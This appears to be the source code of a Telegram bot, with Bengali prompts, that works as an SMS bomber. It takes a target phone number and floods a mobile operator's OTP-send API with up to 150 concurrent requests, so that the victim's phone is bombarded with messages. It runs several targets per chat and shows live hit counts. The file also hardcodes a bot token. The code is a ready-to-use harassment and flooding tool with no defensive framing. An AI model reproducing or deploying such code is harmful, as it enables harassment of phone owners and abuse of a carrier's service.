import os
import re
import json
import asyncio
import gc
import psutil
from pathlib import Path
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse
import aiohttp
from telegram import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ---------------- CONFIG ----------------
BOT_TOKEN = "7719776924:AAGxCXF0as6sGihPkWrlMqmM6A7T2TKEduo"  # তোমার bot token
API_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
HEADERS = {"Content-Type": "application/json"}
HISTORY_FILE = Path("history.json")
CONCURRENCY = 150
WAKEUP_URL = "https://rkbotxyz.onrender.com"  # তোমার wakeup link

# ------------- HELPERS ------------------
def load_history():
    if HISTORY_FILE.exists():
        try:
            return json.loads(HISTORY_FILE.read_text())
        except Exception:
            return {}
    return {}

def save_history(data):
    HISTORY_FILE.write_text(json.dumps(data, indent=2))

history = load_history()
running_jobs = {}

# ------------- FASTAPI ------------------
app = FastAPI()

@app.get("/", response_class=HTMLResponse)
async def home():
    return HTMLResponse("<h3>🚀 RK-SYSTEM Bot Running Successfully!</h3>")

@app.get("/health")
async def health():
    return JSONResponse({"status": "ok"})

# ------------- MEMORY CLEANUP ------------------
async def memory_cleanup():
    process = psutil.Process(os.getpid())
    while True:
        try:
            mem_usage = process.memory_info().rss / 1024 / 1024
            if mem_usage > 450:
                print(f"⚠️ Memory high ({mem_usage:.2f} MB). Cleanup running...")
                gc.collect()
            await asyncio.sleep(10)
        except Exception as e:
            print(f"[MemoryCleanup Error] {e}")
            await asyncio.sleep(10)

# ------------- REQUEST SENDER ------------------
class RequestStats:
    def __init__(self):
        self.success = 0
        self.dismiss = 0
        self.total = 0

async def send_requests(number: str, stop_event: asyncio.Event, stats: RequestStats):
    sem = asyncio.Semaphore(CONCURRENCY)
    timeout = aiohttp.ClientTimeout(total=10)

    async with aiohttp.ClientSession(timeout=timeout) as session:
        async def fire_once():
            payload = {"msisdn": number}
            async with sem:
                try:
                    async with session.post(API_URL, json=payload, headers=HEADERS) as r:
                        text = await r.text()
                        stats.total += 1
                        if '"status":"SUCCESSFUL"' in text:
                            stats.success += 1
                        else:
                            stats.dismiss += 1
                except Exception:
                    stats.dismiss += 1

        while not stop_event.is_set():
            tasks = [asyncio.create_task(fire_once()) for _ in range(10)]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.1)

# ------------- TELEGRAM BOT ------------------
async def start(update, context: ContextTypes.DEFAULT_TYPE):
    kb = ReplyKeyboardMarkup([[KeyboardButton("এসএমএস বোম্বার")]], resize_keyboard=True)
    await update.message.reply_text("স্বাগতম! এসএমএস বোম্বিং করতে নিচের বাটনে চাপুন 👇", reply_markup=kb)

async def mini_button(update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    chat_id = str(update.effective_chat.id)

    if text == "এসএমএস বোম্বার":
        await update.message.reply_text("টার্গেট নাম্বার দিন📱")
        return

    if re.fullmatch(r"01\d{9}", text):
        ikb = InlineKeyboardMarkup.from_button(
            InlineKeyboardButton("Start", callback_data=f"start|{text}")
        )
        await update.message.reply_text(
            f"নম্বর: {text}\nনিচে Start চাপলে বোম্বিং শুরু হবে 🚀",
            reply_markup=ikb
        )
    else:
        await update.message.reply_text("❌ নম্বর সঠিক নয়! 01XXXXXXXXX ফরম্যাটে দিন।")

async def callback_handler(update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = str(query.message.chat.id)
    data = query.data

    if data.startswith("start|"):
        number = data.split("|", 1)[1]

        if chat_id not in running_jobs:
            running_jobs[chat_id] = []

        if len(running_jobs[chat_id]) >= 5:
            await query.message.reply_text("⚠️ সর্বাধিক 5টি নম্বর একই সাথে চালু হতে পারে। আগে কিছু Stop করুন।")
            return

        stop_event = asyncio.Event()
        stats = RequestStats()
        task = asyncio.create_task(send_requests(number, stop_event, stats))
        running_jobs[chat_id].append({
            "number": number,
            "task": task,
            "stop_event": stop_event,
            "stats": stats
        })
        await query.message.reply_text(
            f"✅ এই নম্বরে {number} বোম্বিং শুরু হয়েছে।\n👉 বন্ধ করতে /stop {number}\n👉 চেক করতে /check"
        )

async def stop(update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    args = context.args

    if chat_id not in running_jobs or not running_jobs[chat_id]:
        await update.message.reply_text("🚫 কোনো বোম্বিং চলছে না।")
        return

    if not args:
        await update.message.reply_text("❌ বন্ধ করতে চাইলে নম্বর দিন। উদাহরণ: /stop 017xxxxxxxx")
        return

    number = args[0]
    job_index = next((i for i, job in enumerate(running_jobs[chat_id]) if job["number"] == number), None)

    if job_index is None:
        await update.message.reply_text(f"🚫 {number} এর কোনো চলমান বোম্বিং রিকোয়েস্ট নেই।")
        return

    job = running_jobs[chat_id].pop(job_index)
    job["stop_event"].set()
    stats = job["stats"]
    await update.message.reply_text(
        f"🛑 বোম্বিং বন্ধ করা হয়েছে!\nনম্বর: {job['number']}\n✅ Success: {stats.success}\n❌ Dismiss: {stats.dismiss}\n📊 Total: {stats.total}"
    )

async def check(update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)

    if chat_id not in running_jobs or not running_jobs[chat_id]:
        await update.message.reply_text("📭 এখন কোনো বোম্বিং রানিং নেই।")
        return

    text_lines = []
    for job in running_jobs[chat_id]:
        stats = job["stats"]
        text_lines.append(
            f"নম্বর: {job['number']}\n✅ Success: {stats.success}\n❌ Dismiss: {stats.dismiss}\n📊 Total: {stats.total}"
        )
    await update.message.reply_text("📡 Live Stats:\n\n" + "\n\n".join(text_lines))

# ------------- TELEGRAM LOOP ------------------
async def telegram_bot():
    app_bot = ApplicationBuilder().token(BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("stop", stop))
    app_bot.add_handler(CommandHandler("check", check))
    app_bot.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), mini_button))
    app_bot.add_handler(CallbackQueryHandler(callback_handler))

    await app_bot.initialize()
    await app_bot.start()
    await app_bot.updater.start_polling()
    print("✅ Telegram bot started")

    while True:
        await asyncio.sleep(3600)

# ------------- AUTO WAKEUP ------------------
async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(WAKEUP_URL) as r:
                    print(f"[AutoWakeup] Ping {r.status}")
        except Exception as e:
            print(f"[AutoWakeup Error] {e}")
        await asyncio.sleep(600)

# ------------- FASTAPI STARTUP ------------------
@app.on_event("startup")
async def startup():
    asyncio.create_task(telegram_bot())
    asyncio.create_task(keep_alive())
    asyncio.create_task(memory_cleanup())
    print("🚀 Server started successfully!")

# ------------- RUN LOCALLY ------------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("rkbot:app", host="8.8.8.8", port=int(os.getenv("PORT", 5000)))
